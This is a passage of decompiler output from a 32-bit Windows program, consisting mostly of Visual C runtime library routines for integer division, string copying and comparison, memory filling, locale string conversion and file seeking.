  return 0;
}



bool FUN_00409ec8(void *param_1,UINT_PTR param_2)

{
  BOOL BVar1;
  
  BVar1 = IsBadReadPtr(param_1,param_2);
  return BVar1 == 0;
}



bool FUN_00409ee4(LPVOID param_1,UINT_PTR param_2)

{
  BOOL BVar1;
  
  BVar1 = IsBadWritePtr(param_1,param_2);
  return BVar1 == 0;
}



bool FUN_00409f00(FARPROC param_1)

{
  BOOL BVar1;
  
  BVar1 = IsBadCodePtr(param_1);
  return BVar1 == 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

DWORD FUN_00409f18(LONG param_1,DWORD param_2)

{
  byte *pbVar1;
  HANDLE hFile;
  DWORD DVar2;
  DWORD DVar3;
  int iVar4;
  uint unaff_retaddr;
  
  FUN_00409c85(10);
  FUN_0040b476(0x16);
  __exit(3);
  if (unaff_retaddr < DAT_004138e0) {
    iVar4 = (unaff_retaddr & 0x1f) * 8;
    if ((*(byte *)((&DAT_004137e0)[(int)unaff_retaddr >> 5] + 4 + iVar4) & 1) != 0) {
      hFile = (HANDLE)FUN_0040ae6c(unaff_retaddr);
      if (hFile == (HANDLE)0xffffffff) {
        _DAT_004122f4 = 9;
        return 0xffffffff;
      }
      DVar2 = SetFilePointer(hFile,param_1,(PLONG)0x0,param_2);
      if (DVar2 == 0xffffffff) {
        DVar3 = GetLastError();
      }
      else {
        DVar3 = 0;
      }
      if (DVar3 != 0) {
        FUN_0040ad8b(DVar3);
        return 0xffffffff;
      }
      pbVar1 = (byte *)((&DAT_004137e0)[(int)unaff_retaddr >> 5] + 4 + iVar4);
      *pbVar1 = *pbVar1 & 0xfd;
      return DVar2;
    }
  }
  _DAT_004122f8 = 0;
  _DAT_004122f4 = 9;
  return 0xffffffff;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

DWORD FUN_00409f2f(uint param_1,LONG param_2,DWORD param_3)

{
  byte *pbVar1;
  HANDLE hFile;
  DWORD DVar2;
  DWORD DVar3;
  int iVar4;
  
  if (param_1 < DAT_004138e0) {
    iVar4 = (param_1 & 0x1f) * 8;
    if ((*(byte *)((&DAT_004137e0)[(int)param_1 >> 5] + 4 + iVar4) & 1) != 0) {
      hFile = (HANDLE)FUN_0040ae6c(param_1);
      if (hFile == (HANDLE)0xffffffff) {
        _DAT_004122f4 = 9;
        return 0xffffffff;
      }
      DVar2 = SetFilePointer(hFile,param_2,(PLONG)0x0,param_3);
      if (DVar2 == 0xffffffff) {
        DVar3 = GetLastError();
      }
      else {
        DVar3 = 0;
      }
      if (DVar3 != 0) {
        FUN_0040ad8b(DVar3);
        return 0xffffffff;
      }
      pbVar1 = (byte *)((&DAT_004137e0)[(int)param_1 >> 5] + 4 + iVar4);
      *pbVar1 = *pbVar1 & 0xfd;
      return DVar2;
    }
  }
  _DAT_004122f8 = 0;
  _DAT_004122f4 = 9;
  return 0xffffffff;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00409fc9(undefined4 *param_1)

{
  void *pvVar1;
  
  _DAT_00412540 = _DAT_00412540 + 1;
  pvVar1 = _malloc(0x1000);
  param_1[2] = pvVar1;
  if (pvVar1 == (void *)0x0) {
    param_1[3] = param_1[3] | 4;
    param_1[2] = param_1 + 5;
    param_1[6] = 2;
  }
  else {
    param_1[3] = param_1[3] | 8;
    param_1[6] = 0x1000;
  }
  param_1[1] = 0;
  *param_1 = param_1[2];
  return;
}



byte FUN_0040a00d(uint param_1)

{
  if (DAT_004138e0 <= param_1) {
    return 0;
  }
  return *(byte *)((&DAT_004137e0)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 8) & 0x40;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

LPSTR FUN_0040a0ec(LPSTR param_1,WCHAR param_2)

{
  LPSTR pCVar1;
  
  pCVar1 = param_1;
  if (param_1 == (LPSTR)0x0) {
    return param_1;
  }
  if (DAT_00412348 == 0) {
    if ((ushort)param_2 < 0x100) {
      *param_1 = (CHAR)param_2;
      return (LPSTR)0x1;
    }
  }
  else {
    param_1 = (LPSTR)0x0;
    pCVar1 = (LPSTR)WideCharToMultiByte(DAT_00412358,0x220,&param_2,1,pCVar1,DAT_00411ba4,
                                        (LPCSTR)0x0,(LPBOOL)&param_1);
    if ((pCVar1 != (LPSTR)0x0) && (param_1 == (LPSTR)0x0)) {
      return pCVar1;
    }
  }
  _DAT_004122f4 = 0x2a;
  return (LPSTR)0xffffffff;
}



// Library Function - Single Match
//  __aulldiv
// 
// Library: Visual Studio

undefined8 __aulldiv(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  
  uVar3 = param_1;
  uVar8 = param_4;
  uVar6 = param_2;
  uVar9 = param_3;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar5 = uVar8 >> 1;
      uVar9 = uVar9 >> 1 | (uint)((uVar8 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar8 = uVar5;
      uVar6 = uVar7;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar9;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar8 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar8)) ||
       ((param_2 <= uVar8 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  __aullrem
// 
// Library: Visual Studio

undefined8 __aullrem(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  int iVar6;
  int iVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  bool bVar11;
  
  uVar3 = param_1;
  uVar4 = param_4;
  uVar9 = param_2;
  uVar10 = param_3;
  if (param_4 == 0) {
    iVar6 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) %
                 (ulonglong)param_3);
    iVar7 = 0;
  }
  else {
    do {
      uVar5 = uVar4 >> 1;
      uVar10 = uVar10 >> 1 | (uint)((uVar4 & 1) != 0) << 0x1f;
      uVar8 = uVar9 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar4 = uVar5;
      uVar9 = uVar8;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar8,uVar3) / (ulonglong)uVar10;
    uVar3 = (int)uVar1 * param_4;
    lVar2 = (uVar1 & 0xffffffff) * (ulonglong)param_3;
    uVar9 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar4 = (uint)lVar2;
    uVar10 = uVar9 + uVar3;
    if (((CARRY4(uVar9,uVar3)) || (param_2 < uVar10)) || ((param_2 <= uVar10 && (param_1 < uVar4))))
    {
      bVar11 = uVar4 < param_3;
      uVar4 = uVar4 - param_3;
      uVar10 = (uVar10 - param_4) - (uint)bVar11;
    }
    iVar6 = -(uVar4 - param_1);
    iVar7 = -(uint)(uVar4 - param_1 != 0) - ((uVar10 - param_2) - (uint)(uVar4 < param_1));
  }
  return CONCAT44(iVar7,iVar6);
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uint FUN_0040a245(LPWSTR param_1,byte *param_2,uint param_3)

{
  byte bVar1;
  int iVar2;
  
  if ((param_2 != (byte *)0x0) && (param_3 != 0)) {
    bVar1 = *param_2;
    if (bVar1 != 0) {
      if (DAT_00412348 == 0) {
        if (param_1 != (LPWSTR)0x0) {
          *param_1 = (ushort)bVar1;
        }
        return 1;
      }
      if ((PTR_DAT_00411998[(uint)bVar1 * 2 + 1] & 0x80) == 0) {
        iVar2 = MultiByteToWideChar(DAT_00412358,9,(LPCSTR)param_2,1,param_1,
                                    (uint)(param_1 != (LPWSTR)0x0));
        if (iVar2 != 0) {
          return 1;
        }
      }
      else {
        if (1 < (int)DAT_00411ba4) {
          if ((int)param_3 < (int)DAT_00411ba4) {
            _DAT_004122f4 = 0x2a;
            return 0xffffffff;
          }
          iVar2 = MultiByteToWideChar(DAT_00412358,9,(LPCSTR)param_2,DAT_00411ba4,param_1,
                                      (uint)(param_1 != (LPWSTR)0x0));
          if (iVar2 != 0) {
            return DAT_00411ba4;
          }
        }
        if ((DAT_00411ba4 <= param_3) && (param_2[1] != 0)) {
          return DAT_00411ba4;
        }
      }
      _DAT_004122f4 = 0x2a;
      return 0xffffffff;
    }
    if (param_1 != (LPWSTR)0x0) {
      *param_1 = L'\0';
    }
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uint FUN_0040a30d(uint param_1,byte **param_2)

{
  byte **ppbVar1;
  byte **ppbVar2;
  byte *pbVar3;
  undefined *puVar4;
  int iVar5;
  uint uVar6;
  
  ppbVar2 = param_2;
  if ((*(byte *)(param_2 + 3) & 0x40) != 0) {
LAB_0040a3df:
    ppbVar2 = param_2 + 1;
    *ppbVar2 = *ppbVar2 + -2;
    if ((int)*ppbVar2 < 0) {
      param_1 = FUN_0040b6fa(param_1 & 0xffff,param_2);
    }
    else {
      *(undefined2 *)*param_2 = (undefined2)param_1;
      *param_2 = *param_2 + 2;
    }
    return param_1;
  }
  pbVar3 = param_2[4];
  if (pbVar3 == (byte *)0xffffffff) {
    puVar4 = &DAT_00411cf8;
  }
  else {
    puVar4 = (undefined *)((&DAT_004137e0)[(int)pbVar3 >> 5] + ((uint)pbVar3 & 0x1f) * 8);
  }
  if ((puVar4[4] & 0x80) == 0) goto LAB_0040a3df;
  iVar5 = FUN_0040a0ec(&param_2,param_1);
  if (iVar5 == -1) {
    _DAT_004122f4 = 0x2a;
    return 0xffff;
  }
  if (iVar5 == 1) {
    ppbVar1 = ppbVar2 + 1;
    *ppbVar1 = *ppbVar1 + -1;
    param_2._1_1_ = (byte)param_2;
    if (-1 < (int)*ppbVar1) {
      **ppbVar2 = (byte)param_2;
LAB_0040a384:
      uVar6 = (uint)(byte)param_2;
      *ppbVar2 = *ppbVar2 + 1;
      goto LAB_0040a395;
    }
  }
  else {
    ppbVar1 = ppbVar2 + 1;
    *ppbVar1 = *ppbVar1 + -1;
    if ((int)*ppbVar1 < 0) {
      uVar6 = FUN_004060cd((int)(char)(byte)param_2,ppbVar2);
    }
    else {
      **ppbVar2 = (byte)param_2;
      *ppbVar2 = *ppbVar2 + 1;
      uVar6 = (uint)param_2 & 0xff;
    }
    if (uVar6 == 0xffffffff) {
      return 0xffff;
    }
    ppbVar1 = ppbVar2 + 1;
    *ppbVar1 = *ppbVar1 + -1;
    if (-1 < (int)*ppbVar1) {
      **ppbVar2 = param_2._1_1_;
      param_2._0_1_ = param_2._1_1_;
      goto LAB_0040a384;
    }
  }
  uVar6 = FUN_004060cd((int)(char)param_2._1_1_,ppbVar2);
LAB_0040a395:
  if (uVar6 == 0xffffffff) {
    return 0xffff;
  }
  return param_1 & 0xffff;
}



size_t FUN_0040a402(LCID param_1,uint param_2,LPCWSTR param_3,int param_4,LPWSTR param_5,
                   size_t param_6,UINT param_7)

{
  int iVar1;
  size_t sVar2;
  int iVar3;
  void *local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &DAT_0040d770;
  puStack_10 = &LAB_00409b74;
  local_14 = ExceptionList;
  ExceptionList = &local_14;
  if (DAT_00412544 == 0) {
    ExceptionList = &local_14;
    iVar1 = LCMapStringW(0,0x100,L"",1,(LPWSTR)0x0,0);
    if (iVar1 == 0) {
      iVar1 = LCMapStringA(0,0x100,"",1,(LPSTR)0x0,0);
      if (iVar1 == 0) {
        ExceptionList = local_14;
        return 0;
      }
      DAT_00412544 = 2;
    }
    else {
      DAT_00412544 = 1;
    }
  }
  if (0 < param_4) {
    param_4 = FUN_0040a60b(param_3,param_4);
  }
  if (DAT_00412544 == 1) {
    sVar2 = LCMapStringW(param_1,param_2,param_3,param_4,param_5,param_6);
    ExceptionList = local_14;
    return sVar2;
  }
  if (DAT_00412544 == 2) {
    if (param_7 == 0) {
      param_7 = DAT_00412358;
    }
    iVar1 = WideCharToMultiByte(param_7,0x220,param_3,param_4,(LPSTR)0x0,0,(LPCSTR)0x0,(LPBOOL)0x0);
    if (iVar1 != 0) {
      local_8 = 0;
      FUN_00404830();
      local_8 = 0xffffffff;
      if ((&stack0x00000000 != (undefined *)0x3c) &&
         (iVar3 = WideCharToMultiByte(param_7,0x220,param_3,param_4,&stack0xffffffc4,iVar1,
                                      (LPCSTR)0x0,(LPBOOL)0x0), iVar3 != 0)) {
        sVar2 = LCMapStringA(param_1,param_2,&stack0xffffffc4,iVar1,(LPSTR)0x0,0);
        if (sVar2 != 0) {
          local_8 = 1;
          FUN_00404830();
          local_8 = 0xffffffff;
          if ((&stack0x00000000 != (undefined *)0x3c) &&
             (iVar1 = LCMapStringA(param_1,param_2,&stack0xffffffc4,iVar1,&stack0xffffffc4,sVar2),
             iVar1 != 0)) {
            if ((param_2 & 0x400) != 0) {
              if (param_6 != 0) {
                if ((int)sVar2 <= (int)param_6) {
                  param_6 = sVar2;
                }
                _strncpy((char *)param_5,&stack0xffffffc4,param_6);
                ExceptionList = local_14;
                return sVar2;
              }
              ExceptionList = local_14;
              return sVar2;
            }
            if (param_6 == 0) {
              param_6 = 0;
              param_5 = (LPWSTR)0x0;
            }
            sVar2 = MultiByteToWideChar(param_7,1,&stack0xffffffc4,sVar2,param_5,param_6);
            if (sVar2 != 0) {
              ExceptionList = local_14;
              return sVar2;
            }
          }
        }
      }
    }
  }
  ExceptionList = local_14;
  return 0;
}



int FUN_0040a60b(short *param_1,int param_2)

{
  short *psVar1;
  int iVar2;
  
  psVar1 = param_1;
  iVar2 = param_2;
  if (param_2 != 0) {
    do {
      iVar2 = iVar2 + -1;
      if (*psVar1 == 0) break;
      psVar1 = psVar1 + 1;
    } while (iVar2 != 0);
  }
  if (*psVar1 == 0) {
    return (int)psVar1 - (int)param_1 >> 1;
  }
  return param_2;
}



BOOL FUN_0040a63b(DWORD param_1,LPCWSTR param_2,int param_3,LPWORD param_4,UINT param_5,LCID param_6
                 )

{
  undefined *puVar1;
  BOOL BVar2;
  int iVar3;
  LPCSTR local_30;
  size_t local_2c;
  WORD local_20 [2];
  undefined *local_1c;
  void *local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &DAT_0040d788;
  puStack_10 = &LAB_00409b74;
  local_14 = ExceptionList;
  local_1c = &stack0xffffffc4;
  iVar3 = DAT_00412548;
  ExceptionList = &local_14;
  puVar1 = &stack0xffffffc4;
  if (DAT_00412548 == 0) {
    ExceptionList = &local_14;
    BVar2 = GetStringTypeW(1,L"",1,local_20);
    iVar3 = 1;
    puVar1 = local_1c;
    if (BVar2 == 0) {
      BVar2 = GetStringTypeA(0,1,"",1,local_20);
      if (BVar2 == 0) {
        ExceptionList = local_14;
        return 0;
      }
      iVar3 = 2;
      puVar1 = local_1c;
    }
  }
  local_1c = puVar1;
  DAT_00412548 = iVar3;
  if (DAT_00412548 != 1) {
    if (DAT_00412548 == 2) {
      if (param_5 == 0) {
        param_5 = DAT_00412358;
      }
      local_30 = &stack0xffffffc4;
      local_2c = WideCharToMultiByte(param_5,0x220,param_2,param_3,(LPSTR)0x0,0,(LPCSTR)0x0,
                                     (LPBOOL)0x0);
      if (local_2c != 0) {
        local_8 = 0;
        FUN_00404830();
        local_1c = &stack0xffffffc4;
        _memset(&stack0xffffffc4,0,local_2c);
        local_8 = 0xffffffff;
        if (&stack0x00000000 != (undefined *)0x3c) {
          iVar3 = WideCharToMultiByte(param_5,0x220,param_2,param_3,&stack0xffffffc4,local_2c,
                                      (LPCSTR)0x0,(LPBOOL)0x0);
          if (iVar3 != 0) {
            local_8 = 1;
            FUN_00404830();
            local_8 = 0xffffffff;
            if (&stack0x00000000 != (undefined *)0x3c) {
              if (param_6 == 0) {
                param_6 = DAT_00412348;
              }
              local_1c = &stack0xffffffc4;
              *(short *)(&stack0xffffffc4 + param_3 * 2) = -1;
              local_20[param_3 + -0xf] = 0xffff;
              BVar2 = GetStringTypeA(param_6,param_1,local_30,local_2c,(LPWORD)&stack0xffffffc4);
              if ((local_20[param_3 + -0xf] != 0xffff) &&
                 (*(short *)(&stack0xffffffc4 + param_3 * 2) == -1)) {
                FUN_004041b0(param_4,&stack0xffffffc4,param_3 * 2);
                ExceptionList = local_14;
                return BVar2;
              }
            }
          }
        }
      }
    }
    ExceptionList = local_14;
    return 0;
  }
  BVar2 = GetStringTypeW(param_1,param_2,param_3,param_4);
  ExceptionList = local_14;
  return BVar2;
}



void FUN_0040a800(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  FUN_0040a817(param_1,param_2,param_3,0);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uint FUN_0040a817(byte *param_1,byte **param_2,uint param_3,uint param_4)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  byte bVar4;
  uint uVar5;
  uint local_c;
  byte *local_8;
  
  local_c = 0;
  bVar4 = *param_1;
  local_8 = param_1 + 1;
  while( true ) {
    if (DAT_00411ba4 < 2) {
      uVar1 = (byte)PTR_DAT_00411998[(uint)bVar4 * 2] & 8;
    }
    else {
      uVar1 = FUN_004087a7(bVar4,8);
    }
    if (uVar1 == 0) break;
    bVar4 = *local_8;
    local_8 = local_8 + 1;
  }
  if (bVar4 == 0x2d) {
    param_4 = param_4 | 2;
LAB_0040a872:
    bVar4 = *local_8;
    local_8 = local_8 + 1;
  }
  else if (bVar4 == 0x2b) goto LAB_0040a872;
  if ((((int)param_3 < 0) || (param_3 == 1)) || (0x24 < (int)param_3)) {
    if (param_2 != (byte **)0x0) {
      *param_2 = param_1;
    }
    return 0;
  }
  if (param_3 == 0) {
    if (bVar4 != 0x30) {
      param_3 = 10;
      goto LAB_0040a8dc;
    }
    if ((*local_8 != 0x78) && (*local_8 != 0x58)) {
      param_3 = 8;
      goto LAB_0040a8dc;
    }
    param_3 = 0x10;
  }
  if (((param_3 == 0x10) && (bVar4 == 0x30)) && ((*local_8 == 0x78 || (*local_8 == 0x58)))) {
    bVar4 = local_8[1];
    local_8 = local_8 + 2;
  }
LAB_0040a8dc:
  uVar1 = (uint)(0xffffffff / (ulonglong)param_3);
  do {
    uVar5 = (uint)bVar4;
    if (DAT_00411ba4 < 2) {
      uVar2 = (byte)PTR_DAT_00411998[uVar5 * 2] & 4;
    }
    else {
      uVar2 = FUN_004087a7(uVar5,4);
    }
    if (uVar2 == 0) {
      if (DAT_00411ba4 < 2) {
        uVar5 = *(ushort *)(PTR_DAT_00411998 + uVar5 * 2) & 0x103;
      }
      else {
        uVar5 = FUN_004087a7(uVar5,0x103);
      }
      if (uVar5 == 0) {
LAB_0040a988:
        local_8 = local_8 + -1;
        if ((param_4 & 8) == 0) {
          if (param_2 != (byte **)0x0) {
            local_8 = param_1;
          }
          local_c = 0;
        }
        else if (((param_4 & 4) != 0) ||
                (((param_4 & 1) == 0 &&
                 ((((param_4 & 2) != 0 && (0x80000000 < local_c)) ||
                  (((param_4 & 2) == 0 && (0x7fffffff < local_c)))))))) {
          _DAT_004122f4 = 0x22;
          if ((param_4 & 1) == 0) {
            local_c = ((param_4 & 2) != 0) + 0x7fffffff;
          }
          else {
            local_c = 0xffffffff;
          }
        }
        if (param_2 != (byte **)0x0) {
          *param_2 = local_8;
        }
        if ((param_4 & 2) == 0) {
          return local_c;
        }
        return -local_c;
      }
      iVar3 = FUN_0040b81e((int)(char)bVar4);
      uVar5 = iVar3 - 0x37;
    }
    else {
      uVar5 = (int)(char)bVar4 - 0x30;
    }
    if (param_3 <= uVar5) goto LAB_0040a988;
    if ((local_c < uVar1) ||
       ((local_c == uVar1 && (uVar5 <= (uint)(0xffffffff % (ulonglong)param_3))))) {
      local_c = local_c * param_3 + uVar5;
      param_4 = param_4 | 8;
    }
    else {
      param_4 = param_4 | 0xc;
    }
    bVar4 = *local_8;
    local_8 = local_8 + 1;
  } while( true );
}



// Library Function - Single Match
//  _strncmp
// 
// Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release

int __cdecl _strncmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  char cVar1;
  char cVar2;
  byte bVar3;
  size_t sVar4;
  int iVar5;
  uint uVar6;
  char *pcVar7;
  char *pcVar8;
  bool bVar9;
  
  sVar4 = _MaxCount;
  pcVar7 = _Str1;
  if (_MaxCount != 0) {
    do {
      if (sVar4 == 0) break;
      sVar4 = sVar4 - 1;
      cVar1 = *pcVar7;
      pcVar7 = pcVar7 + 1;
    } while (cVar1 != '\0');
    iVar5 = _MaxCount - sVar4;
    do {
      pcVar7 = _Str2;
      pcVar8 = _Str1;
      if (iVar5 == 0) break;
      iVar5 = iVar5 + -1;
      pcVar8 = _Str1 + 1;
      pcVar7 = _Str2 + 1;
      cVar1 = *_Str2;
      cVar2 = *_Str1;
      _Str2 = pcVar7;
      _Str1 = pcVar8;
    } while (cVar1 == cVar2);
    bVar3 = pcVar7[-1];
    uVar6 = 0;
    bVar9 = bVar3 == pcVar8[-1];
    if (bVar3 < (byte)pcVar8[-1] || bVar9) {
      if (bVar9) {
        return 0;
      }
      uVar6 = 0xfffffffe;
    }
    _MaxCount = ~uVar6;
  }
  return _MaxCount;
}



// Library Function - Single Match
//  _memset
// 
// Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release

void * __cdecl _memset(void *_Dst,int _Val,size_t _Size)

{
  uint uVar1;
  uint uVar2;
  size_t sVar3;
  uint *puVar4;
  
  if (_Size == 0) {
    return _Dst;
  }
  uVar1 = _Val & 0xff;
  puVar4 = (uint *)_Dst;
  if (3 < _Size) {
    uVar2 = -(int)_Dst & 3;
    sVar3 = _Size;
    if (uVar2 != 0) {
      sVar3 = _Size - uVar2;
      do {
        *(undefined *)puVar4 = (undefined)_Val;
        puVar4 = (uint *)((int)puVar4 + 1);
        uVar2 = uVar2 - 1;
      } while (uVar2 != 0);
    }
    uVar1 = uVar1 * 0x1010101;
    _Size = sVar3 & 3;
    uVar2 = sVar3 >> 2;
    if (uVar2 != 0) {
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar4 = uVar1;
        puVar4 = puVar4 + 1;
      }
      if (_Size == 0) {
        return _Dst;
      }
    }
  }
  do {
    *(char *)puVar4 = (char)uVar1;
    puVar4 = (uint *)((int)puVar4 + 1);
    _Size = _Size - 1;
  } while (_Size != 0);
  return _Dst;
}



BOOL FUN_0040aab8(DWORD param_1,LPCSTR param_2,int param_3,LPWORD param_4,UINT param_5,LCID param_6,
                 int param_7)

{
  undefined *puVar1;
  BOOL BVar2;
  int iVar3;
  WORD local_20 [2];
  undefined *local_1c;
  void *local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &DAT_0040d7a0;
  puStack_10 = &LAB_00409b74;
  local_14 = ExceptionList;
  local_1c = &stack0xffffffc8;
  iVar3 = DAT_0041254c;
  ExceptionList = &local_14;
  puVar1 = &stack0xffffffc8;
  if (DAT_0041254c == 0) {
    ExceptionList = &local_14;
    BVar2 = GetStringTypeW(1,L"",1,local_20);
    iVar3 = 1;
    puVar1 = local_1c;
    if (BVar2 == 0) {
      BVar2 = GetStringTypeA(0,1,"",1,local_20);
      if (BVar2 == 0) {
        ExceptionList = local_14;
        return 0;
      }
      iVar3 = 2;
      puVar1 = local_1c;
    }
  }
  local_1c = puVar1;
  DAT_0041254c = iVar3;
  if (DAT_0041254c != 2) {
    if (DAT_0041254c == 1) {
      if (param_5 == 0) {
        param_5 = DAT_00412358;
      }
      iVar3 = MultiByteToWideChar(param_5,(-(uint)(param_7 != 0) & 8) + 1,param_2,param_3,
                                  (LPWSTR)0x0,0);
      if (iVar3 != 0) {
        local_8 = 0;
        FUN_00404830();
        local_1c = &stack0xffffffc8;
        _memset(&stack0xffffffc8,0,iVar3 * 2);
        local_8 = 0xffffffff;
        if ((&stack0x00000000 != (undefined *)0x38) &&
           (iVar3 = MultiByteToWideChar(param_5,1,param_2,param_3,(LPWSTR)&stack0xffffffc8,iVar3),
           iVar3 != 0)) {
          BVar2 = GetStringTypeW(param_1,(LPCWSTR)&stack0xffffffc8,iVar3,param_4);
          ExceptionList = local_14;
          return BVar2;
        }
      }
    }
    ExceptionList = local_14;
    return 0;
  }
  if (param_6 == 0) {
    param_6 = DAT_00412348;
  }
  BVar2 = GetStringTypeA(param_6,param_1,param_2,param_3,param_4);
  ExceptionList = local_14;
  return BVar2;
}



// Library Function - Single Match
//  _strncpy
// 
// Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release

char * __cdecl _strncpy(char *_Dest,char *_Source,size_t _Count)

{
  uint uVar1;
  uint uVar2;
  char cVar3;
  uint uVar4;
  uint *puVar5;
  
  if (_Count == 0) {
    return _Dest;
  }
  puVar5 = (uint *)_Dest;
  if (((uint)_Source & 3) != 0) {
    while( true ) {
      cVar3 = *_Source;
      _Source = (char *)((int)_Source + 1);
      *(char *)puVar5 = cVar3;
      puVar5 = (uint *)((int)puVar5 + 1);
      _Count = _Count - 1;
      if (_Count == 0) {
        return _Dest;
      }
      if (cVar3 == '\0') break;
      if (((uint)_Source & 3) == 0) {
        uVar4 = _Count >> 2;
        goto joined_r0x0040ac4e;
      }
    }
    do {
      if (((uint)puVar5 & 3) == 0) {
        uVar4 = _Count >> 2;
        if (uVar4 == 0) goto LAB_0040ac8b;
        goto LAB_0040acf9;
      }
      *(undefined *)puVar5 = 0;
      puVar5 = (uint *)((int)puVar5 + 1);
      _Count = _Count - 1;
    } while (_Count != 0);
    return _Dest;
  }
  uVar4 = _Count >> 2;
  if (uVar4 != 0) {
    do {
      uVar1 = *(uint *)_Source;
      uVar2 = *(uint *)_Source;
      _Source = (char *)((int)_Source + 4);
      if (((uVar1 ^ 0xffffffff ^ uVar1 + 0x7efefeff) & 0x81010100) != 0) {
        if ((char)uVar2 == '\0') {
          *puVar5 = 0;
joined_r0x0040acf5:
          while( true ) {
            uVar4 = uVar4 - 1;
            puVar5 = puVar5 + 1;
            if (uVar4 == 0) break;
LAB_0040acf9:
            *puVar5 = 0;
          }
          cVar3 = '\0';
          _Count = _Count & 3;
          if (_Count != 0) goto LAB_0040ac8b;
          return _Dest;
        }
        if ((char)(uVar2 >> 8) == '\0') {
          *puVar5 = uVar2 & 0xff;
          goto joined_r0x0040acf5;
        }
        if ((uVar2 & 0xff0000) == 0) {
          *puVar5 = uVar2 & 0xffff;
          goto joined_r0x0040acf5;
        }
        if ((uVar2 & 0xff000000) == 0) {
          *puVar5 = uVar2;
          goto joined_r0x0040acf5;
        }
      }
      *puVar5 = uVar2;
      puVar5 = puVar5 + 1;
      uVar4 = uVar4 - 1;
joined_r0x0040ac4e:
    } while (uVar4 != 0);
    _Count = _Count & 3;
    if (_Count == 0) {
      return _Dest;
    }
  }
  do {
    cVar3 = *_Source;
    _Source = (char *)((int)_Source + 1);
    *(char *)puVar5 = cVar3;
    puVar5 = (uint *)((int)puVar5 + 1);
    if (cVar3 == '\0') {
      while (_Count = _Count - 1, _Count != 0) {
LAB_0040ac8b:
        *(char *)puVar5 = cVar3;
        puVar5 = (uint *)((int)puVar5 + 1);
      }
      return _Dest;
    }
    _Count = _Count - 1;
  } while (_Count != 0);
  return _Dest;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uchar * FUN_0040ad0e(uchar *param_1)

{
  int iVar1;
  size_t _MaxCount;
  size_t sVar2;
  uchar **ppuVar3;
  
  if (((_DAT_00413908 != 0) &&
      ((DAT_0041231c != (uchar **)0x0 ||
       (((DAT_00412324 != 0 && (iVar1 = FUN_0040b929(), iVar1 == 0)) &&
        (DAT_0041231c != (uchar **)0x0)))))) && (ppuVar3 = DAT_0041231c, param_1 != (uchar *)0x0)) {
    _MaxCount = _strlen((char *)param_1);
    for (; *ppuVar3 != (uchar *)0x0; ppuVar3 = ppuVar3 + 1) {
      sVar2 = _strlen((char *)*ppuVar3);
      if (((_MaxCount < sVar2) && ((*ppuVar3)[_MaxCount] == '=')) &&
         (iVar1 = __mbsnbicoll(*ppuVar3,param_1,_MaxCount), iVar1 == 0)) {
        return *ppuVar3 + _MaxCount + 1;
      }
    }
  }
  return (uchar *)0x0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0040ad8b(uint param_1)

{
  uint *puVar1;
  int iVar2;
  
  iVar2 = 0;
  _DAT_004122f8 = param_1;
  puVar1 = &DAT_00412030;
  do {
    if (param_1 == *puVar1) {
      _DAT_004122f4 = (&DAT_00412034)[iVar2 * 2];
      return;
    }
    puVar1 = puVar1 + 2;
    iVar2 = iVar2 + 1;
  } while (puVar1 < &DAT_00412198);
  if ((0x12 < param_1) && (param_1 < 0x25)) {
    _DAT_004122f4 = 0xd;
    return;
  }
  if ((param_1 < 0xbc) || (_DAT_004122f4 = 8, 0xca < param_1)) {
    _DAT_004122f4 = 0x16;
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_0040adf2(uint param_1)

{
  int *piVar1;
  int iVar2;
  DWORD nStdHandle;
  
  if (param_1 < DAT_004138e0) {
